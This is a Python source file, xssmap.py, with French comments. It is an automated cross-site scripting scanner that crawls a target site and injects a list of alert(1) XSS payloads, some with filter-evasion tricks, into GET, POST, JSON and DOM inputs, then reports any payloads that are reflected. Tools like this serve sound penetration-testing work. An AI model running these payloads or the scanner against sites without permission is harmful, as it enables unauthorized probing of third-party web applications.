# xssmap.py - Scanner XSS avancé avec crawl, GET, POST, JSON, DOM, rapport

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
import json
import time
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<scr<script>ipt>alert(1)</script>",
    "<scr<script%0d%0a>ipt>alert(1)</script>",
    "<img src='x' onerror=&#97;lert(1)>"
]

REPORT = []


def save_report(method, url, param, payload):
    print(f"[!] XSS Found - {method} - {param} \u2192 {url}")
    REPORT.append({
        "method": method,
        "url": url,
        "parameter": param,
        "payload": payload
    })


def generate_report(filename="report.json"):
    with open(filename, "w") as f:
        json.dump(REPORT, f, indent=4)
    print(f"[+] Report saved to {filename}")


def test_get_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    for param in params:
        for payload in XSS_PAYLOADS:
            new_params = params.copy()
            new_params[param] = payload
            new_query = urlencode(new_params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))

            try:
                resp = requests.get(new_url, timeout=5)
                if payload in resp.text:
                    save_report('GET', new_url, param, payload)
            except:
                continue


def test_post_params(url, post_data):
    for param in post_data:
        for payload in XSS_PAYLOADS:
            new_data = post_data.copy()
            new_data[param] = payload
            try:
                resp = requests.post(url, data=new_data, timeout=5)
                if payload in resp.text:
                    save_report('POST', url, param, payload)
            except:
                continue


def test_json_params(url, json_data):
    for param in json_data:
        for payload in XSS_PAYLOADS:
            new_json = json_data.copy()
            new_json[param] = payload
            try:
                resp = requests.post(url, json=new_json, headers={"Content-Type": "application/json"}, timeout=5)
                if payload in resp.text:
                    save_report('JSON', url, param, payload)
            except:
                continue


def test_dom_xss(url):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    driver = webdriver.Chrome(options=chrome_options)

    for payload in XSS_PAYLOADS:
        test_url = url + "?" + urlencode({"xss": payload})
        try:
            driver.get(test_url)
            time.sleep(2)
            if payload in driver.page_source:
                save_report('DOM', test_url, 'xss', payload)
        except:
            continue

    driver.quit()


def is_valid_url(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)


def discover_urls(base_url, max_depth=2):
    visited = set()
    to_visit = [(base_url, 0)]
    found_urls = set()

    while to_visit:
        url, depth = to_visit.pop()
        if url in visited or depth > max_depth:
            continue

        try:
            resp = requests.get(url, timeout=5)
            visited.add(url)

            soup = BeautifulSoup(resp.text, "lxml")
            for link in soup.find_all("a", href=True):
                full_url = urljoin(url, link['href'])
                if is_valid_url(full_url) and base_url in full_url:
                    if "?" in full_url:
                        found_urls.add(full_url)
                    to_visit.append((full_url, depth + 1))
        except:
            continue

    print(f"[+] Discovered {len(found_urls)} URLs with parameters.")
    return list(found_urls)


def main():
    print("""
    ------------------------------------
      XSSMAP - Advanced XSS Scanner
    ------------------------------------
    """)
    mode = input("Choose scan mode [GET / POST / JSON / DOM / AUTO / CRAWL]: ").strip().upper()

    if mode == "CRAWL":
        base = input("Enter base domain to crawl (e.g. https://target.com): ")
        urls = discover_urls(base)
        for u in urls:
            test_get_params(u)

    else:
        url = input("Target URL: ").strip()

        if mode == "GET":
            test_get_params(url)

        elif mode == "POST":
            raw_data = input("POST data (param1=value1&param2=value2): ")
            post_data = dict(pair.split('=') for pair in raw_data.split('&'))
            test_post_params(url, post_data)

        elif mode == "JSON":
            raw_json = input("JSON data (ex: {\"user\": \"test\"}): ")
            json_data = json.loads(raw_json)
            test_json_params(url, json_data)

        elif mode == "DOM":
            test_dom_xss(url)

        elif mode == "AUTO":
            test_get_params(url)
            test_dom_xss(url)

    generate_report()


if __name__ == "__main__":
    main()
